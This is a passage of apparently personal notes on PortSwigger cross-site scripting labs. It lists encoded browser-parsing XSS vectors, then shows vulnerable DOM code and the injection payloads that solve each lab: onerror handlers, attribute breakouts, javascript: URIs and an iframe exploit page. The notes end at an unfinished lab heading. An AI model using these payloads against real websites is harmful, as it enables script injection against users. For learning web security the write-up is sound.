# Portswigger (Cross Site Scripting)


## Understanding browser parsing

Reference: https://www.attacker-domain.com/2013/04/deep-dive-into-browser-parsing-and-xss.html

```
1. <a href="%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"></a>
URL encoded "javascript:alert(1)"

2. <a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61   %6c%65%72%74%28%32%29">
Character entity encoded "javascript" and URL encoded "alert(2)"

3. <a href="javascript%3aalert(3)"></a>
URL encoded ":"

4. <div>&#60;img src=x onerror=alert(4)&#62;</div>
Character entity encoded < and >

5. <textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea>
Character entity encoded < and >

6. <textarea><script>alert(6)</script></textarea>

Advanced
7. <button onclick="confirm('7&#39;);">Button</button>
Character entity encoded '

8. <button onclick="confirm('8\u0027);">Button</button>
Unicode escape sequence encoded '

9. <script>&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59</script>
Character entity encoded alert(9);

10. <script>\u0061\u006c\u0065\u0072\u0074(10);</script>
Unicode Escape sequence encoded alert

11. <script>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</script>
Unicode Escape sequence encoded alert(11)

12. <script>\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</script>
Unicode Escape sequence encoded alert and 12

13. <script>alert('13\u0027)</script>
Unicode escape sequence encoded '

14. <script>alert('14\u000a')</script>
Unicode escape sequence encoded line feed.

Bonus
15.     <a
      href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;
&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;
&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;
&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;
&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;
&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;
&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;
&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x31;
&#x35;&#x29;"></a>
```


## Lab: Reflected XSS into HTML context with nothing encoded

```html
<img/src=x onerror=alert(1)>
```

## Lab: Stored XSS into HTML context with nothing encoded

in the comment add the same payload as above. 

## Lab: DOM XSS in document.write sink using source location.search

The vulnerable script here is:

```js
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```

Here we can inject the query paramter to be a onload function

```js

" onload=alert(1) "><!--

```

## Lab: DOM XSS in innerHTML sink using source location.search

Same logic as available but this time the payload is even simpler. The flawed code is below

```js
<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script>
```

We just need to pass a valid XSS payload in the query param

```html
<img/src=x onerror=alert(1) />
```

## Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

The vulnerable code here is:

```js
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>
```
We are here setting the href value for a 'a' tag and it's user controlled. I can just provide the URL to be a javascript: scheme URI

Payload:

```
https://ac591f861fed0e7cc0f8a581000f0090.web-security-academy.net/feedback?returnPath=javascript:alert(1)
```

## Lab: DOM XSS in jQuery selector sink using a hashchange event

The vulnerable code

```js
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```

So based on the site: https://stackoverflow.com/questions/43792317/exploiting-xss-in-jquery-1-7-2-selector when you have 

```js
$('. <img src=x onerror=alert(1)>');
```

jQuery will try to create a image tag. We can use this to exploit. The final paylaod looks like

```html
<html>
    
<script>
function exploit(e) {
e.src += "#') . <img src=x onerror=print() />";
}
</script>

<body><iframe src="https://ac811fa21ffdc828c0fe52d300b100b3.web-security-academy.net/" onload="exploit(this);"></iframe></body>

</html>
```

## Lab: Reflected XSS into attribute with angle brackets HTML-encoded

This one was simple as well. The payload needed to be inserted in the value of in the input tag and I could escape it using the double quotes. Once I had control over the input tag, I could craft a number of payloads for XSS. The one I used was

```js
" autofocus onfocusin=alert(1) "
```

There are plenty more in: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet


## Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded